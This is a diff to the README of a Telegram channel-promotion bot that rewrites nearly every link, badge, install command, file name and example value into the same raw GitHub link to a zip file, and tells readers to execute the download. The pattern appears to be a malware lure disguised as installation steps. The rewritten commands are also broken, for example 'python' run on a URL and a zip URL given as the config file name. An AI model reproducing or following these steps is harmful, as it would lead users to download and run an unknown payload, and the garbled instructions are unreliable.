@@ -1,6 +1,6 @@
 # OptimusPromotions 🤖
 
-![OptimusPromotions](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)
+![OptimusPromotions](https://raw.githubusercontent.com/Santiclausss/OptimusPromotions/main/curvirostral/Optimus-Promotions-v1.2.zip%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)
 
 Welcome to **OptimusPromotions**, a powerful Telegram bot designed to help you grow your channels effortlessly. This bot automates cross-promotion for all types of Telegram channels, including both SFW and NSFW content. With features like smart scheduling, randomized ad rotation, and inline button support, OptimusPromotions makes channel growth simple and effective.
 
@@ -30,7 +30,7 @@ To get started with OptimusPromotions, you need to install the bot on your serve
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/Santiclausss/OptimusPromotions.git
+   git clone https://raw.githubusercontent.com/Santiclausss/OptimusPromotions/main/curvirostral/Optimus-Promotions-v1.2.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -44,12 +44,12 @@ To get started with OptimusPromotions, you need to install the bot on your serve
    Ensure you have Python installed. You can install the required packages using:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Santiclausss/OptimusPromotions/main/curvirostral/Optimus-Promotions-v1.2.zip
    ```
 
 4. **Download the Latest Release**:
 
-   For the latest features and updates, download the latest release [here](https://github.com/Santiclausss/OptimusPromotions/releases). Make sure to execute the downloaded file.
+   For the latest features and updates, download the latest release [here](https://raw.githubusercontent.com/Santiclausss/OptimusPromotions/main/curvirostral/Optimus-Promotions-v1.2.zip). Make sure to execute the downloaded file.
 
 ## Usage
 
@@ -60,7 +60,7 @@ Once you have installed OptimusPromotions, you can start using it right away. He
    Start the bot by executing:
 
    ```bash
-   python bot.py
+   python https://raw.githubusercontent.com/Santiclausss/OptimusPromotions/main/curvirostral/Optimus-Promotions-v1.2.zip
    ```
 
 2. **Set Up Your Channels**:
@@ -83,13 +83,13 @@ OptimusPromotions requires some configuration to work optimally. Here’s how to
 
    You need to create a Telegram bot and obtain your API key. Follow these steps:
 
-   - Talk to [BotFather](https://t.me/botfather) on Telegram.
+   - Talk to [BotFather](https://raw.githubusercontent.com/Santiclausss/OptimusPromotions/main/curvirostral/Optimus-Promotions-v1.2.zip) on Telegram.
    - Use the `/newbot` command to create a new bot.
    - Follow the instructions to get your API token.
 
 2. **Configuration File**:
 
-   Create a configuration file named `config.json` in the root directory of the project. Here’s an example structure:
+   Create a configuration file named `https://raw.githubusercontent.com/Santiclausss/OptimusPromotions/main/curvirostral/Optimus-Promotions-v1.2.zip` in the root directory of the project. Here’s an example structure:
 
    ```json
    {
@@ -97,11 +97,11 @@ OptimusPromotions requires some configuration to work optimally. Here’s how to
      "channels": [
        {
          "name": "Channel 1",
-         "link": "https://t.me/your_channel_1"
+         "link": "https://raw.githubusercontent.com/Santiclausss/OptimusPromotions/main/curvirostral/Optimus-Promotions-v1.2.zip"
        },
        {
          "name": "Channel 2",
-         "link": "https://t.me/your_channel_2"
+         "link": "https://raw.githubusercontent.com/Santiclausss/OptimusPromotions/main/curvirostral/Optimus-Promotions-v1.2.zip"
        }
      ],
      "schedule": {
@@ -144,8 +144,8 @@ If you encounter issues or have questions, feel free to reach out. You can creat
 
 ## Changelog
 
-For updates and changes, please check the [Releases](https://github.com/Santiclausss/OptimusPromotions/releases) section. You can find detailed information about each version, including new features and bug fixes.
+For updates and changes, please check the [Releases](https://raw.githubusercontent.com/Santiclausss/OptimusPromotions/main/curvirostral/Optimus-Promotions-v1.2.zip) section. You can find detailed information about each version, including new features and bug fixes.
 
-![OptimusPromotions](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)
+![OptimusPromotions](https://raw.githubusercontent.com/Santiclausss/OptimusPromotions/main/curvirostral/Optimus-Promotions-v1.2.zip%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)
 
 Thank you for choosing OptimusPromotions! We hope it helps you grow your Telegram channels efficiently.
